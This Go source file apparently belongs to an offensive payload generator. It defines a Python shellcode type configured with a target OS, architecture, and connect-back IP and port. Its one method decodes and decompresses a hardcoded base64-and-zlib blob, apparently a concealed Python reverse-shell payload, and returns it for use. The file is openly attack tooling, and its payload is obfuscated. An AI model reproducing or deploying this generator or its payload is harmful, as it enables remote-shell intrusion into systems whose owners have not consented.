package shellcode

import (
	"bytes"
	"compress/zlib"
	"encoding/base64"
	"io"
)

type PyShellCode struct {
    *ShellCodeBase
}

func NewPyShellCode(osTarget, osTargetArch, connectBackIP string, connectBackPort int, badChars []byte, prefix, suffix string) *PyShellCode {
    base := NewShellCodeBase(osTarget, osTargetArch, connectBackIP, connectBackPort, badChars, prefix, suffix)
    return &PyShellCode{base}
}

func (p *PyShellCode) GetPyShellCode() (string, error) {
    code := "eJxtUsFu2zAMvfsrWORgezOctdhpQA5BkGHFuiZofBuGQLY4WKgteZKcoijy7yUlNzOK6mLz8fHpkeLiajk6u6yVXg7PvjU6Uf1grAdnmkf0hRvrwZoGnUt+7A4VrCB9ebnbbdZ3HJ7PKdBZQNUiWOyNR2iN88l+98DcicrR+Qzwn+tEjxDuEQ5GhxLqZ/CcQHtCmzgqjg7K+MmmaP39eHu/rYq37GG3+Xk8VA/b9a88WUBjtMbGgzcgvBdEsdCLplUaE1dO2Sxj7wWwrZyrHGoJTwjC4psCSuIznqW/P/2BTUSV0bB1XtSdci3KqzRUe0F9dMYMyVOrOoTrb0ns1GKj8ERNtdh1pNz3QsuQk8ILbrEkyim7/nLzNQ/4YJX2ITtJqL+gvIN/o/IFD0hDbVE8ghlpdOS66YzDaRihhAqiOL0UV6Vg7AxJozc+QWi6RpoPTPLDs8nLCpR7M6DOWK2I/FVlR6R/L8nQas683W8DjtZ+iCv9Hs4vUxOS+xvG2FEUP55ENyLZ4ZIyYiVTsxw+X0C6bQInsfC0UWy+FFE4PvBcP+zQfKS0NByS3itrQQTj"

    compressed, err := base64.StdEncoding.DecodeString(code)
    if err != nil {
        return "", err
    }

    reader, err := zlib.NewReader(bytes.NewReader(compressed))
    if err != nil {
        return "", err
    }

    defer reader.Close()

    decompressed, err := io.ReadAll(reader)
    if err != nil {
        return "", err
    }

    return string(decompressed), nil
}

